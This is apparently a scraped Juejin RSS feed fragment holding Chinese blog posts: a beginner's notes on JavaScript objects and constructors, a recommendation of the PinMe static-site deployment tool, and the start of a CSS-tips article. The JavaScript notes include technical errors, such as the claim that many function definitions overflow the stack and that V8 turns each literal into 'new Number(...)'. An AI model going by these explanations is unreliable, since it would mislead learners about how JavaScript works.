12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>目前我的 JS 技能树点亮了“对象”这一格，这篇文章就是一份“新手村”笔记，只用我已掌握的钥匙，把对象这只“收纳盒”的隔层、暗格、标签一次性摸清楚，不越级打怪，也不提前透支未来语法。如果你也刚学完对象，想先把它玩透再往下走，欢迎一起原地复盘，把基础踩成肌肉记忆。</p>
<h2 data-id="heading-1">对象</h2>
<ul>
<li>在 js 这门语言中流传着一句话叫 万物皆对象，顾名思义不管你是哪种数据类型都可看作是对象。<br/>
我们知道的数据类型可分为两种——原始类型和引用类型</li>
</ul>
<ol>
<li><strong>原始类型</strong>又叫简单类型，有 <code>string</code> <code>number</code> <code>boolean</code> <code>undefined</code> <code>null</code> <code>Symbol</code> <code>bigInt</code></li>
<li><strong>引用类型</strong>又叫复杂类型，有 <code>function</code> <code>array</code> <code>object</code></li>
</ol>
<ul>
<li>在解释为什么万物都可被称为对象之前我们先聊今天第一个话题——如何创建一个对象</li>
</ul>
<h3 data-id="heading-2">一. 创建对象的方式</h3>
<h4 data-id="heading-3">1. <strong>对象字面量</strong> 只用一个 <code>{}</code> 就能解决</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> obj = {
    a : <span class="hljs-number">1</span>
    }    <span class="hljs-comment">// 这是我们最常看到的</span>
</code></pre>
<h4 data-id="heading-4">2. <strong>new Object()</strong>  用<code>new Object()</code> 创建一个对象后，再在外围添加属性</h4>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">obj</span> = new Object()  // 构造函数
<span class="hljs-attr">obj.name</span> = <span class="hljs-string">'饶总'</span>
const <span class="hljs-attr">abc</span> = <span class="hljs-string">'age'</span>   // 目的添加 key 为 age ，value 为 <span class="hljs-number">20</span>
obj<span class="hljs-section">[abc]</span> = 20   //当 abc 是变量的时候用<span class="hljs-section">[]</span>，就可直接访问到 age
delete obj<span class="hljs-section">[abc]</span>   //要删掉属性就用 delete
console.log(obj)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-5">3. <strong>new 调用自定义的构造函数</strong>   关于构造函数</h4>
<ul>
<li>当我们需要批量化创建对象时，可以使用构造函数<br/>
方便理解这句话，首先我们设立一个目标，我们要把公司员工的姓名年龄职位输入到系统里面方便统计管理，按照古板的方法就是创造无数个职位对应的函数，一个一个输入姓名年龄放进去</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Insert</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: name,
    <span class="hljs-attr">age</span>: age,
    <span class="hljs-attr">job</span>: <span class="hljs-string">'coder'</span>
  }
  <span class="hljs-keyword">return</span> obj
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Insert2</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: name,
    <span class="hljs-attr">age</span>: age,
    <span class="hljs-attr">job</span>: <span class="hljs-string">'manager'</span>
  }
  <span class="hljs-keyword">return</span> obj
}

<span class="hljs-title class_">Insert</span>(<span class="hljs-string">'饶总'</span>, <span class="hljs-number">18</span>)
</code></pre>
<p>但是栈的容量有限，函数过多就会导致爆栈，那么这个时候就可以用构造函数来解决</p>
<pre><code class="hljs language-ini" lang="ini">function Insert(name, age, job) {
  <span class="hljs-attr">this.name</span> = name
  <span class="hljs-attr">this.age</span> = age
  <span class="hljs-attr">this.job</span> = job
}
const <span class="hljs-attr">p</span> = new Insert(<span class="hljs-string">'晓总'</span>, <span class="hljs-number">18</span>, <span class="hljs-string">'coder'</span>) // { name: <span class="hljs-string">'晓总'</span>, age: <span class="hljs-number">18</span>, job: <span class="hljs-string">'coder'</span> }
const <span class="hljs-attr">p2</span> = new Insert(<span class="hljs-string">'佳颖'</span>, <span class="hljs-number">19</span>, <span class="hljs-string">'manager'</span>)
console.log(p)<span class="hljs-comment">;</span>
console.log(p2)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>当一个函数被 new 调用时，我们称之为构造函数<br/>
再来一个关于生产汽车的例子</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">function Car(color) {
  <span class="hljs-attr">this.name</span> = <span class="hljs-string">'su7'</span>
  <span class="hljs-attr">this.height</span> = <span class="hljs-string">'1400'</span>
  <span class="hljs-attr">this.lang</span> = <span class="hljs-string">'4800'</span>
  <span class="hljs-attr">this.weight</span> = <span class="hljs-string">'1500'</span>
  <span class="hljs-attr">this.color</span> = color
}

const <span class="hljs-attr">car1</span> = new Car(<span class="hljs-string">'purple'</span>) // 实例化一个对象
const <span class="hljs-attr">car2</span> = new Car(<span class="hljs-string">'yellow'</span>)
</code></pre>
<p>由于生产的汽车的大部分标签是一样的，只有极个别标签能自行选择，这个时候用 new 构造一个函数就显得尤为高明</p>
<h3 data-id="heading-6">二.  new 干了什么？</h3>
<ol>
<li>创建一个 this 对象</li>
<li>执行构造函数中的代码，就是给 this 对象添加属性值</li>
<li>返回这个 this 对象</li>
</ol>
<pre><code class="hljs language-objectivec" lang="objectivec">function person() {
  <span class="hljs-keyword">const</span> _<span class="hljs-variable language_">this</span> = {}   <span class="hljs-comment">//构造一个 _this 对象</span>
  _<span class="hljs-variable language_">this</span>.name = <span class="hljs-string">'su7'</span>   
  _<span class="hljs-variable language_">this</span>.color = <span class="hljs-string">'green'</span>  <span class="hljs-comment">//给该对象添加属性值</span>
  <span class="hljs-keyword">return</span> _<span class="hljs-variable language_">this</span>       <span class="hljs-comment">//返回该对象</span>
}

<span class="hljs-keyword">const</span> obj = person()

console.log(obj);
</code></pre>
<h3 data-id="heading-7">三. 什么是包装类？</h3>
<h4 data-id="heading-8">1. 当用户定义一个字面量，v8默认执行的还是 new Xxx()</h4>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">num</span> = <span class="hljs-number">123</span>  //var num = new Number(<span class="hljs-number">123</span>)  
var <span class="hljs-attr">str</span> = <span class="hljs-string">'hello'</span>  //var str = new String(<span class="hljs-string">'hello'</span>)
</code></pre>
<h4 data-id="heading-9">2. 一个包装类的实例对象，在参与运算时，会自动拆箱成原始类型</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">var</span> <span class="hljs-built_in">num</span> = <span class="hljs-number">123</span>  <span class="hljs-comment">// v8 默认执行 var num = new Number(123)</span>
<span class="hljs-built_in">num</span>.a = <span class="hljs-string">'aaa'</span>
<span class="hljs-comment">//delete num.a   // 发现是原始类型就自动删除</span>
console.log(<span class="hljs-built_in">num</span>.a); <span class="hljs-comment">// 执行结果为 undefined，既证明了 num 可以是对象，又说明了 num 的属性被删除了</span>
</code></pre>
<h4 data-id="heading-10">3. 因为 js 是弱类型语言, 所以只有在赋值语句执行时才会判断值的类型(typeof)，当值被判定为原始类型时，就会自动将包装对象上添加的属性移除</h4>
<pre><code class="hljs language-python" lang="python">var <span class="hljs-built_in">str</span> = <span class="hljs-string">'hello'</span> 
//typeof(<span class="hljs-string">'hello'</span>)   判断类型为string
//  v8执行 var <span class="hljs-built_in">str</span> = new String(<span class="hljs-string">'hello'</span>)
<span class="hljs-built_in">str</span>.<span class="hljs-built_in">len</span> = <span class="hljs-number">2</span>
//delete <span class="hljs-built_in">str</span>.<span class="hljs-built_in">len</span>  将包装对象上添加的属性移除
</code></pre>
<h2 data-id="heading-11">结语</h2>
<p>对象既是 JavaScript 的地基，也是后续所有语法的交汇点；先把这块“自留地”的边界、门牌和规则摸透，再学任何新框架都能事半功倍。愿这份最基础的笔记，能在你未来的进阶路上当一块靠谱的垫脚石。感谢阅读！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[推荐 3 个 AI 智能体 GitHub 项目，太绝了啊。]]></title>    <link>https://juejin.cn/post/7574671792997990435</link>    <guid>https://juejin.cn/post/7574671792997990435</guid>    <pubDate>2025-11-21T02:22:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574671792997990435" data-draft-id="7574671792997941283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="推荐 3 个 AI 智能体 GitHub 项目，太绝了啊。"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-21T02:22:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            推荐 3 个 AI 智能体 GitHub 项目，太绝了啊。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:22:44.000Z" title="Fri Nov 21 2025 02:22:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>逛 GitHub 发现了一个快速部署网站的开源项目。</p>
<p>在 AI 生成 HTML 前端页面成本极低的今天，这个开源项目相当有用。</p>
<p>这个叫 PinMe 的 GitHub 项目可以快速、免费、文档的部署 AI 生成的网页或 <strong>Vue、React 项目。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e78c5809ad6e450199cd280f52229bd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296564&amp;x-signature=8Ou3U9M37RJgRIsdhnxVtSVwT%2FE%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-0">01、开源项目介绍</h2>
<p>PinMe 这个一键部署神器，能将静态网站快速部署到网上。搞出来一个链接，微信发出去，别人就能访问了。</p>
<p><strong>它的原理是利用  IPFS（一种分布式存储网络）来存储文件，并自动生成一个免费的、基于 ENS 域名的永久链接。</strong> 无需 DNS，无需服务器。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/509e62c72fa94f8d941c51fa2c099630~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296564&amp;x-signature=lbCby%2FLrYsN7oB5Aok%2Bczh2%2BYds%3D" alt="图片" loading="lazy"/></p>
<p>这个叫PinMe 开源项目的主要优势是：</p>
<ul>
<li>免费：0 元成本，传统方式仅域名和服务器一年约 300 元。</li>
<li>极速：30 秒上线，传统部署需要 30 分钟或更久。</li>
<li>稳定：依托 IPFS 网络，内容分布式存储，不易宕机，传统服务器挂了就无法访问。</li>
<li>便捷：支持两种方式上传网页拖拽零命令和命令行的方式。</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/glitternetwork/pinme</span>
</code></pre>
<h2 data-id="heading-1">02、实战一下</h2>
<p>我使用两种方式，快速部署 AI 生成的静态网页。生成一个外链，谁都能访问。</p>
<p>首先，我让 AI ：搜索《思考快与慢》书籍的核心思想，生产一个美观的 html 网页介绍一下这本书。</p>
<p>① 上传网页的方式部署</p>
<p>可以浏览器打开 PinMe 开源项目官方网站的地址：</p>
<pre><code class="hljs language-arduino" lang="arduino">网站地址：https:<span class="hljs-comment">//pinme.eth.limo</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/827e9b115634474196ed0ca0e2a972db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296564&amp;x-signature=s13rprQkgLnAki5X8lanejmzNDo%3D" alt="图片" loading="lazy"/></p>
<p>把 AI 生成的 HTML 或者将 Vue、React 项目打包好的 dist 文件夹直接拖进网页。等待上传完成，复制生成的链接即可分享。</p>
<p>② 使用命令的方式</p>
<p>使用 npm 安装 pinme，在项目目录下执行：pinme upload 命令就能获取链接，完成部署。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ba49ed184a64fd89a8fe4c0676af739~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296564&amp;x-signature=JYOiTIFWRu%2FPYKvJcQcXbc7%2FpXA%3D" alt="图片" loading="lazy"/></p>
<p>然后使用 pinme upload 命令上传你的 html 文件或者部署打包的项目文件夹。然后它就会返回一个任何人都能访问的 URL 了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bec2f0a744f44ba58e36b059d170db51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764296564&amp;x-signature=9ONXxl0dH2qrYAsHY1Kdp7i6w4U%3D" alt="图片" loading="lazy"/></p>
<p>还有更多进阶的功能比如可以集成到 GitHub Actions 中，实现代码一推送就自动构建和部署。</p>
<p>还能多环境管理，为测试、预览、正式环境部署不同的链接。还能查看部署历史，并删除旧版本。</p>
<p>如果你需要快速、免费地分享一个前端页面，比如 Demo、简历、作品集，<strong>PinMe 提供了一个近乎完美的解决方案</strong>，让你不再为临时部署而烦恼。</p>
<pre><code class="hljs language-bash" lang="bash">立即体验：https://pinme.eth.limo开源地址：https://github.com/glitternetwork/pinme
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[20个CSS实用技巧，10分钟从小白变大神！]]></title>    <link>https://juejin.cn/post/7574745301723709446</link>    <guid>https://juejin.cn/post/7574745301723709446</guid>    <pubDate>2025-11-21T02:48:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574745301723709446" data-draft-id="7568425510792986624" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="20个CSS实用技巧，10分钟从小白变大神！"/> <meta itemprop="keywords" content="前端,CSS"/> <meta itemprop="datePublished" content="2025-11-21T02:48:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="刘大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            20个CSS实用技巧，10分钟从小白变大神！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    刘大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:48:29.000Z" title="Fri Nov 21 2025 02:48:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是大华！今天给大家分享一些比较实用的CSS技巧，不管你是前端新手还是老司机，这些技巧都能让你的开发效率翻倍！废话不多说，直接上代码了。</p>
